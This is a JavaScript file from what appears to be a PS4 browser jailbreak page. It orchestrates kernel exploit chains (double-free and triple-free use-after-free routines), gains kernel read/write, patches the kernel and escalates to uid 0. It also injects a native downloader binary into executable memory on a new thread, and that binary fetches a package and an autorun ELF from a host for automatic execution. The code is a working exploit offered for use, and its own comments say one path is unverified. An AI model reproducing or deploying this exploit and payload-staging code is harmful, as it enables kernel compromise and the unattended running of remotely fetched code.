function load_script(src, remote = true, transfer = []) {
  return new Promise((resolve, reject) => {
    const script = document.createElement("script");
    script.src = src;
    script.onload = resolve;
    script.onerror = reject;
    document.head.appendChild(script);
  });
}

// ================== LUDORA DOWNLOADER (PRE-GOLDHEN) ==================
// Unconditional: BEFORE GoldHEN loads, inject the self-contained downloader .bin and
// feed it the target host/port/path and expected SHA-256 via the params area at
// [base + 0x9000]. The downloader does outbound HTTP GET -> stream to
// /data/pkg/ludora.pkg -> SHA-256 -> write the GoldHEN AutoRun three-piece set
// (ludora_autorun.elf + payloads.ini + config.ini), all in raw syscalls (no libc, no
// dynamic ELF). It does NOT install: install/launch is GoldHEN AutoRun's job
// (ludora_autorun.elf, a system-level process), so the three-piece set must be in
// place BEFORE GoldHEN starts. Download completes (or fails/times out) before GoldHEN
// starts below; either way GoldHEN still loads. Unlike the g2all 700/900 engines
// (which use chain.sysp / array_from_address / chain.call_int), the css engine uses
// fn.mmap / mem.copy / fn.pthread_create / arw.view plus a jmp-rdi stub to thread the
// downloader so the browser can keep polling the status page at [base + 0x8000].
// NOTE: This path has NOT been verified on real 10.00-11.02 hardware yet.
const LUDORA_DL_STATUS_OFFSET = 0x8000;
const LUDORA_DL_PARAMS_OFFSET = 0x9000;
const LUDORA_DL_PARAMS_MAGIC = 0x4c445043;
const LUDORA_DL_MAGIC = 0x4c445044;
const LUDORA_DL_STAGE_DONE = 0x7f;
const LUDORA_DL_STAGE_FAILED = 0x80;
const LUDORA_DL_STAGE_BODY = 7;

function ludoraDlStageSlug(stage) {
  return ({
    1: 'entry', 2: 'param', 3: 'socket', 4: 'connect', 5: 'send',
    6: 'response-head', 7: 'body', 8: 'hash', 9: 'module-load', 10: 'symbol',
    11: 'install', 12: 'launch', [LUDORA_DL_STAGE_DONE]: 'done', [LUDORA_DL_STAGE_FAILED]: 'failed'
  })[stage] || ('stage-' + stage);
}

function ludoraDlStageName(stage) {
  const slug = ludoraDlStageSlug(stage);
  const key = 'downloader.stage.' + slug;
  const text = window.LudoraI18n ? LudoraI18n.t(key) : slug;
  return text !== key ? text : slug;
}

function dlText(key, values, fallback) {
  return window.LudoraI18n ? LudoraI18n.t(key, values || {}) : fallback;
}

async function ludoraDlResolveParams() {
  try {
    const req = await fetch('/jb/host/pkg/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{}',
      credentials: 'include'
    });
    if (req.ok) {
      const tj = await req.json();
      if (tj && tj.sha256) {
        return {
          ip: String(tj.ip || window.location.hostname),
          port: (tj.port | 0) || 80,
          path: '/jb/host/pkg/ludora.pkg',
          sha256: String(tj.sha256 || ''),
          path2: '/jb/host/autorun/ludora_autorun.elf',
          sha2562: String(tj.autorun_sha256 || '')
        };
      }
    }
  } catch (e) {}
  try {
    const r2 = await fetch('./ludora-download-params.json');
    if (r2.ok) {
      const j = await r2.json();
      if (j && j.ip && j.sha256) {
        return {
          ip: String(j.ip),
          port: (j.port | 0) || 80,
          path: '/jb/host/pkg/ludora.pkg',
          sha256: String(j.sha256),
          path2: '/jb/host/autorun/ludora_autorun.elf',
          sha2562: String(j.autorun_sha256 || '')
        };
      }
    }
  } catch (e) {}
  return null;
}

async function ludoraDlFetchBin() {
  try {
    const r = await fetch('./ludora-web-downloader.bin');
    if (!r.ok) return null;
    const data = new Uint8Array(await r.arrayBuffer());
    if (data.length < 4 || (data[0] === 0x7f && data[1] === 0x45 && data[2] === 0x4c && data[3] === 0x46)) {
      logger.info('downloader refused ELF input');
      return null;
    }
    return data;
  } catch (e) {
    return null;
  }
}

function ludoraDlInject(dlp, data, onComplete) {
  let settled = false;
  function finish() { if (settled) return; settled = true; onComplete(); }
  const ip = String(dlp.ip || '');
  const path = String(dlp.path || '');
  const sha = String(dlp.sha256 || '');
  const path2 = String(dlp.path2 || '');
  const sha2 = String(dlp.sha2562 || '');
  const port = (dlp.port | 0) & 0xffff;

  const pb = new Uint8Array(0x4cc);
  pb[0] = 0x43; pb[1] = 0x50; pb[2] = 0x44; pb[3] = 0x4c;
  pb[4] = port & 0xff; pb[5] = (port >> 8) & 0xff;
  pb[6] = ip.length & 0xff; pb[7] = (ip.length >> 8) & 0xff;
  pb[8] = path.length & 0xff; pb[9] = (path.length >> 8) & 0xff;
  pb[10] = path2.length & 0xff; pb[11] = (path2.length >> 8) & 0xff;
  let i;
  for (i = 0; i < ip.length && i < 64; i++) pb[0x0c + i] = ip.charCodeAt(i) & 0xff;
  for (i = 0; i < path.length && i < 512; i++) pb[0x4c + i] = path.charCodeAt(i) & 0xff;
  for (i = 0; i < 64 && i < sha.length; i++) pb[0x24c + i] = sha.charCodeAt(i) & 0xff;
  for (i = 0; i < path2.length && i < 512; i++) pb[0x28c + i] = path2.charCodeAt(i) & 0xff;
  for (i = 0; i < 64 && i < sha2.length; i++) pb[0x48c + i] = sha2.charCodeAt(i) & 0xff;

  try {
    const payloadBytes = (data.byteLength + 3) & ~3;
    const payloadPages = (payloadBytes + 0xfff) & ~0xfff;
    const mappingBytes = (payloadPages + 0x3000) * 4;
    const prot = PROT_READ | PROT_WRITE | PROT_EXEC;
    const flags = MAP_PRIVATE | MAP_ANONYMOUS;

    const payloadBase = fn.mmap.invoke(0, mappingBytes, prot, flags, -1, 0);
    if (payloadBase.eq(-1)) throw new Error('downloader mmap failed');
    mem.bset(payloadBase, mappingBytes, 0);

    const padded = new Uint8Array(payloadBytes);
    padded.set(data, 0);
    mem.copy(payloadBase, padded.buffer.data(), payloadBytes);

    mem.copy(payloadBase.add(LUDORA_DL_PARAMS_OFFSET), pb.buffer.data(), 0x4cc);

    // 状态页清零(8 个 32-bit 字)
    mem.bset(payloadBase.add(LUDORA_DL_STATUS_OFFSET), 32, 0);

    // jmp rdi; ret 桩:让 pthread 线程带着 rdi=payloadBase 跳进下载器入口
    const loaderBase = fn.mmap.invoke(0, 0x1000, prot, flags, -1, 0);
    if (loaderBase.eq(-1)) throw new Error('loader stub mmap failed');
    const stub = new Uint8Array([0xff, 0xe7, 0xc3, 0x00]); // jmp rdi; ret
    mem.copy(loaderBase, stub.buffer.data(), 4);

    const pthread = mem.alloc(0x10);
    const rc = fn.pthread_create.invoke(pthread, 0, loaderBase, payloadBase);
    logger.info('downloader pthread_create rc=' + rc);
    if (rc !== 0) {
      msgs.textContent = dlText('downloader.failedToStart', null, 'Ludora downloader failed to start (pthread_create rc=' + rc + ').');
      finish();
      return;
    }

    const deadline = Date.now() + 180000;
    let lastSeq = -1;
    let lastStage = 0;
    msgs.textContent = dlText('downloader.running', null, 'Ludora downloader running… (host ' + ip + ':' + port + ')');
    if (window.LudoraUI && window.LudoraUI.progress)
      window.LudoraUI.progress(0, dlText('downloader.preparing', null, '准备下载…'), 'downloading');

    const statusView = arw.view(payloadBase.add(LUDORA_DL_STATUS_OFFSET));
    function poll() {
      const magic = statusView.getUint32(0, true) >>> 0;
      const stage = statusView.getUint32(8, true) >>> 0;
      const result = statusView.getInt32(12, true) | 0;
      const detail0 = statusView.getUint32(16, true) >>> 0;
      const detail1 = statusView.getUint32(20, true) >>> 0;
      const sequence = statusView.getUint32(24, true) >>> 0;
      if (sequence !== lastSeq) {
        lastSeq = sequence;
        lastStage = stage;
        msgs.textContent = dlText('downloader.stage', { stage: ludoraDlStageName(stage) },
          'Ludora downloader: ' + ludoraDlStageName(stage) + (result ? ' (result=' + result + ')' : ''));
        if (stage === LUDORA_DL_STAGE_BODY && detail1 > 0) {
          const pct = Math.floor(detail0 * 100 / detail1);
          const msg = dlText('downloader.downloading', { progress: pct, detail: (detail0 >> 20) + '/' + (detail1 >> 20) + ' MB' }, '下载中 ' + pct + '% · ' + (detail0 >> 20) + '/' + (detail1 >> 20) + ' MB');
          if (window.LudoraUI && window.LudoraUI.progress)
            window.LudoraUI.progress(pct, msg, 'downloading');
        }
      }
      if (magic === LUDORA_DL_MAGIC && (stage === LUDORA_DL_STAGE_DONE || stage === LUDORA_DL_STAGE_FAILED)) {
        if (stage === LUDORA_DL_STAGE_DONE) {
          msgs.textContent = dlText('downloader.staged', null, 'Ludora downloaded and staged (install deferred to GoldHEN AutoRun).');
          if (window.LudoraUI && window.LudoraUI.progress)
            window.LudoraUI.progress(100, detail0 === 1 ? dlText('downloader.exists', null, '已存在,跳过下载') : dlText('downloader.complete', null, '下载完成'), 'done');
        } else {
          msgs.textContent = dlText('downloader.failedAt', { stage: ludoraDlStageName(lastStage) }, 'Ludora downloader failed at ' + ludoraDlStageName(lastStage) + ' (result=' + result + ').');
          if (window.LudoraUI && window.LudoraUI.progress)
            window.LudoraUI.progress(100, dlText('downloader.failed', null, '下载失败'), 'error');
        }
        finish();
        return;
      }
      if (Date.now() >= deadline) {
        msgs.textContent = dlText('downloader.timedOut', { stage: ludoraDlStageName(lastStage) }, 'Ludora downloader timed out at ' + ludoraDlStageName(lastStage) + '.');
        finish();
        return;
      }
      setTimeout(poll, 200);
    }
    poll();
  } catch (e) {
    const detail = e && e.message ? e.message : String(e);
    logger.info('downloader dispatch error: ' + detail);
    msgs.textContent = dlText('downloader.dispatchFailed', { detail: detail }, 'Ludora downloader dispatch failed: ' + detail);
    finish();
  }
}

async function runDownloader() {
  logger.info('Ludora downloader stage starting…');
  msgs.textContent = dlText('downloader.starting', null, 'Ludora downloader stage starting…');
  const dlp = await ludoraDlResolveParams();
  if (!dlp) {
    msgs.textContent = dlText('downloader.parametersUnavailable', null, 'Ludora downloader parameters unavailable (no token, no local JSON).');
    return;
  }
  const dl = await ludoraDlFetchBin();
  if (!dl) {
    msgs.textContent = dlText('downloader.payloadUnavailable', null, 'Ludora downloader payload unavailable.');
    return;
  }
  await new Promise((resolve) => ludoraDlInject(dlp, dl, resolve));
}
// ================== /LUDORA DOWNLOADER (PRE-GOLDHEN) ==================

async function doJb() {
  await load_script("css/misc.js");

  try {
    version.init();
    switch (version.console) {
      case 4:
        await load_script("css/ps4/constants.js");
        await load_script("css/ps4/userland.js");
        break;
      case 5:
        //TODO
        break;
      default:
        logger.info("Unsupported console " + version.console);
    }

    logger.info("===USERLAND===");

    let rw = undefined;
    if (arw.master === undefined) {
      rw = await init_rw();
    }

    init_arw(rw);
    init_rop();
    init_syscalls();

    logger.info("===END===");

    await load_script("css/loader.js");
    await load_script("css/workers.js");

    switch (version.console) {
      case 4:
        await load_script("css/ps4/kernel.js");
        break;
      case 5:
        //TODO
        break;
      default:
        logger.info("Unsupported console " + version.console);
    }

    if (fn.setuid.invoke(0) !== -1) {
      msgs.innerHTML = window.LudoraI18n ? LudoraI18n.t("payload.alreadyLoaded") : "GoldHEN is already loaded.";
      return;
    }

    var exploitChain = localStorage.getItem("exploitChain") || "lapse";
    await load_script("css/" + exploitChain + ".js");
    logger.info("===" + exploitChain.toUpperCase() + "===");

    try {
      if (exploitChain == "lapse") {
        init();
        await setup();
        await double_free_reqs2();
        leak_kaddrs();
        double_free_reqs1();
        make_karw();
        inc_karw_pipe_refcnt();

        logger.info("Corrupted context cleanup started...");
        remove_pktinfo_from_so(pktopts_twins[0]);
        remove_rthdr_from_so(pktopts_twins[1]);
        remove_rthdr_from_so(rthdr_twins[0]);
        logger.info("Corrupted context cleanup completed !!");
      } else {
        init();
        await setup();
        await ucred_triple_free();
        leak_kqueue();
        await make_karw();
        inc_karw_pipe_refcnt();

        logger.info("Corrupted context cleanup started...");
        for (let i = 0; i < triplets.length; i++) {
          remove_rthdr_from_so(triplets[i]);
        }
        remove_uaf_file();
        logger.info("Corrupted context cleanup completed !!");
      }
    } finally {
      cleanup();
    }

    find_all_proc();

    if (fn.setuid.invoke(0) === -1) {
      jailbreak();

      const kpatches_rsp = await fetch("css/ps4/patches/" + constants.KPATCH);
      const kpatches_buf = await kpatches_rsp.arrayBuffer();
      const kpatches_u8 = new Uint8Array(kpatches_buf);
      kernel_patches(kpatches_u8);

      const bin_rsp = await fetch("goldhen_2.4b18.14.bin");
      const bin_buf = await bin_rsp.arrayBuffer();
      const bin_u8 = new Uint8Array(bin_buf);
      await runDownloader();
      load_bin(bin_u8);
    }

    msgs.innerHTML = window.LudoraI18n ? LudoraI18n.t("payload.loaded") : "GoldHEN loaded.";
    logger.info("===END===");
  } catch (e) {
    msgs.innerHTML = window.LudoraI18n ? LudoraI18n.t("payload.failed") : "Load failed. Restart your console and try again.";
    msgs.style.color = "yellow";
  }
}
